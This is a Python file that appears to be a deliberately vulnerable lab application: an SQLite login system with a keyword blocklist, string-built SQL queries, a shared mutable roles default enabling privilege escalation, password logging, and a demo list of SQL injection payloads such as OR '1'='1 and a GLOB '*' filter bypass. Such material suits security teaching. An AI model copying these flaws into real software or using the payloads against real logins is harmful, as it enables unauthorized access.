import os
import re
import sqlite3
import threading
from dataclasses import dataclass, field
from typing import List, Optional

from cryptography.exceptions import InvalidKey
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id

filter_keywords = ["or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/"]

def validate_input(input_str: str, filter_keywords: list) -> bool:
    input_lower = input_str.lower()
    
    pattern = r'\b(' + '|'.join(re.escape(keyword.lower()) for keyword in filter_keywords) + r')\b'
    
    match = re.search(pattern, input_lower)
    if match:
        print(f"Forbidden keyword detected: {match.group()}")
        return False
    return True

def vulnerable_login(username: str, password: str) -> list:
    connection = None
    
    try:
        if not validate_input(username, filter_keywords):
            print("Username contains forbidden keywords!")
            return []
        
        if not validate_input(password, filter_keywords):
            print("Password contains forbidden keywords!")
            return []
        
        connection = sqlite3.connect("vulnerable.db")
        cursor = connection.cursor()
        
        query = f"""
            SELECT users.username, roles.name AS role
            FROM users
            JOIN user_roles ON users.username = user_roles.user_username
            JOIN roles ON roles.name = user_roles.role_name
            WHERE users.username = '{username}' AND users.password = '{password}'
        """
        
        print(f"Executing query: {query}")
        
        cursor.execute(query)
        results = cursor.fetchall()
        return results
    
    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return []
    finally:
        if connection:
            connection.close()


def create_vulnerable_database():
    connection = sqlite3.connect("vulnerable.db")
    cursor = connection.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password BLOB NOT NULL,
            salt BLOB NOT NULL
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS roles (
            name TEXT PRIMARY KEY)
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_roles (
            user_username TEXT,
            role_name TEXT,
            FOREIGN KEY (user_username) REFERENCES users (username),
            FOREIGN KEY (role_name) REFERENCES roles (name),
            PRIMARY KEY (user_username, role_name)
        )
    ''')
    
    connection.commit()
    connection.close()

def singleton(cls):
    instances = {}
    def wrapper(*args, **kwargs):
        global lst
        lst = list()
        if cls not in instances:
            instances[cls] = cls(*args, **kwargs)
        return instances[cls]
    return wrapper

def get_kdf(salt):
    return Argon2id(salt=salt, length=32, iterations=3, lanes=4, memory_cost=64 * 1024)

def hash_pass(password: str, salt: bytes) -> bytes:
    kdf = get_kdf(salt)
    return kdf.derive(password.encode())

def verify_hash(password: str, salt: bytes, hash: str) -> None:
    kdf = get_kdf(salt)
    kdf.verify(password.encode(), hash)

@dataclass
class UserProfile:
    username: str
    password_hash: Optional[bytes] = None
    roles: List[str] = field(default_factory = lambda: lst)

    def __post_init__(self):
        self.salt = os.urandom(16)

    def add_role(self, role: str):
        if role not in self.roles:
            self.roles.append(role)

    def check_admin_access(self) -> bool:
        return "admin" in self.roles

    def __repr__(self):
        return f"UserProfile(username='{self.username}')"

@singleton
class UserManager:
    def __init__(self):
        self.users: List[UserProfile] = []

    def get(self, username: str) -> Optional[UserProfile]:
        for user in self.users:
            if user.username == username:
                return user
        return None
    
    def __getitem__(self, username: str) -> Optional[UserProfile]:
        return self.get(username)
    
    def __setitem__(self, username: str, user: UserProfile) -> Optional[UserProfile]:
        for i, u in enumerate(self.users):
            if u.username == username:
                self.users[i] = user  # Update existing user
                return user
        # If not found, append a new user
        self.users.append(user)
        return user

    def create_user(self, username: str, password: str, roles: list) -> Optional[UserProfile]:
        if self.get(username) is not None:
            return None
        user = UserProfile(username=username)
        user.password_hash = hash_pass(password, user.salt)
        self.users.append(user)
        for role in roles:
            user.add_role(role)
        print(f"Created user: {user}")
        return user

    def login(self, username: str, password: str) -> Optional[UserProfile]:
        for user in self.users:
            if user.username == username:
                try:
                    verify_hash(password, user.salt, user.password_hash)
                    print(f"Login successful for user: {user}")
                    return user
                except InvalidKey as e:
                    break
                except Exception as e:
                    print(f"Error during login: {e}")
        print("Login failed.")
        return None

    def execute_admin_task(self, user: UserProfile, task: str):
        if user.check_admin_access():
            print(f"Executing admin task: {task}")
            return f"Task '{task}' executed!"
        else:
            print(f"User {user.username} does not have admin access.")
            return f"Access denied for task: {task}"
    
    def __len__(self):
        return self.users.__len__()

class Worker:
    def __init__(self, lock: threading.Lock, user_cache: UserManager, db_conn: sqlite3.Connection):
        self.lock = lock
        self.user_cache = user_cache
        self.conn = db_conn

    def _db_get_user_by_username(self, username: str) -> Optional[UserProfile]:
        if not validate_input(username, filter_keywords):
            print("Username contains forbidden keywords!")
            return None
        cursor = self.conn.cursor()
        query = f"SELECT * FROM users WHERE username = '{username}'"
        cursor.execute(query)
        user = cursor.fetchone()
        if user is not None:
            query = f"SELECT role_name FROM user_roles WHERE user_username = '{username}'"
            cursor.execute(query)
            roles = cursor.fetchall()
            return UserProfile(username=user[0], password_hash=user[1], roles=roles)
        return None
    
    def _db_create_user(self, username: str, password_hash: bytes, salt:bytes, roles: list):
        try:
                
            if not validate_input(username, filter_keywords) or not all(validate_input(role, filter_keywords) for role in roles):
                print("Contains forbidden keywords!")
                return None
            cursor = self.conn.cursor()
            
            user_query = "INSERT INTO users(username, password, salt) VALUES (?, ?, ?)"
            cursor.execute(user_query, (username, password_hash, salt))
            
            for role in roles:
                role_query = f"INSERT OR IGNORE INTO roles(name) VALUES ('{role}')"
                cursor.execute(role_query)
                
                user_roles_query = f"INSERT INTO user_roles(user_username, role_name) VALUES ('{username}', '{role}')"
                cursor.execute(user_roles_query)
            
            self.conn.commit()
        except sqlite3.Error as e:
            print(f"Database error during user creation: {e}")


    def get_user_by_username(self, username: str) -> Optional[UserProfile]:
        if self.user_cache.get(username) is not None:
            return self.user_cache.get(username)
        db_usr = self._db_get_user_by_username(username)
        if db_usr is not None:
            self.lock.acquire()
            self.user_cache[username] = db_usr
            self.lock.release()
            return db_usr
        return None
    
    def create_user(self, username: str, password: str, roles: list = []) -> Optional[UserProfile]:
        if self.get_user_by_username(username) is None:
            self.lock.acquire()
            user = self.user_cache.create_user(username, password, roles)
            self.lock.release()
            self._db_create_user(username, user.password_hash, user.salt, roles )
            return user
        return None

    def login_user(self, username: str, password: str) -> Optional[UserProfile]:
        if not validate_input(username, filter_keywords):
            print("Username contains forbidden keywords!")
            return []
        
        if not validate_input(password, filter_keywords):
            print("Password contains forbidden keywords!")
            return []

        print("Password:", password)
        cursor = self.conn.cursor()

        query = f"""
            SELECT users.username
            FROM users
            WHERE users.username = '{username}' AND users.password = '{password}'
        """
        
        print(f"Executing query: {query}")
        
        cursor.execute(query)
        result = cursor.fetchone()
        if result is not None:
            user = self.get_user_by_username(result[0])
            return user
        

        print(username)
        user = self.get_user_by_username(username)
        if user is not None:
            password = hash_pass(password, user.salt)
            query = f"""
                SELECT users.username
                FROM users
                WHERE users.username = ? AND users.password = ?
            """
            cursor.execute(query, (username, password))
            result = cursor.fetchone()
            if result is not None:
                user = self.get_user_by_username(result[0])
                return user
        return None


# Simulate the application
def main():
    # purge db
    if os.path.exists("vulnerable.db"):
        os.remove("vulnerable.db")

    create_vulnerable_database()
    user_manager = UserManager()
    worker = Worker(threading.Lock(), user_manager, sqlite3.connect("vulnerable.db"))

    # Create normal users and admins
    alice = worker.create_user("alice", "password123")

    print(alice.roles)
    admin_bob = worker.create_user("bob", "password123", ["admin"])
    print(admin_bob.roles)

    # Alice escalates privileges using shared mutable roles
    print(alice.roles)
    user_manager.login("alice", "password123")

    charlie = worker.create_user("charlie", "password123")

    print(user_manager.users)
    print(charlie.roles)

    # Verify the DB content directly
    conn = sqlite3.connect("vulnerable.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")
    print("Users in DB:", cursor.fetchall())
    cursor.execute("SELECT * FROM roles")
    print("Roles in DB:", cursor.fetchall())
    cursor.execute("SELECT * FROM user_roles")
    print("User Roles in DB:", cursor.fetchall())
    demonstrate_sqli(worker)

    conn.close()

def demonstrate_sqli(worker):
    """Demonstrate SQL injection techniques with keyword filtering"""
    # Create the vulnerable database first
    #create_vulnerable_database()
    
    print("SQL Injection Demonstration:\n")
    
    # Injection attempts that try to bypass keyword filtering
    injection_attempts = [
        # THIS CAN'T WORK BECAUSE OF THE FILTER KEYWORDS
        # 1. Classic Authentication Bypass
        {"username": "admin'--", "password": "anything"},
        
        # 2. Complex Bypass using OR
        {"username": "admin' OR '1'='1", "password": "anything' OR '1'='1"},

        # 3. Bypassing 'admin' filter
        {"username": "adm1n", "password": "anything"},
        
        # 4. Alternative concatenation
        {"username": "administrator", "password": "'||'"},
        
        # 7. Attempting to break filter with unusual characters
        {"username": "a' GLOB '*", "password": "a' GLOB '*"}, # Só esta é que passa

        {"username": "adm'||'in", "password": "' glob '*"},

        {"username": "alice'='alice", "password": "alice"},
        {"username": "alice", "password": "password123"}, # Login real para ver se o login funciona
    ]
    
    print("Attempting Injections:\n")
    for attempt in injection_attempts:
        print(f"Username: {attempt['username']}")
        print(f"Password: {attempt['password']}")
        
        results = worker.login_user(attempt['username'], attempt['password'])
        
        if results:
            print("Successful injection! Retrieved users:")
            
            print(f"Username: {results.username}, Role: {results.roles}")
        else:
            print("Injection attempt failed")
        print("\n" + "-"*40 + "\n")

if __name__ == "__main__":
    main()

    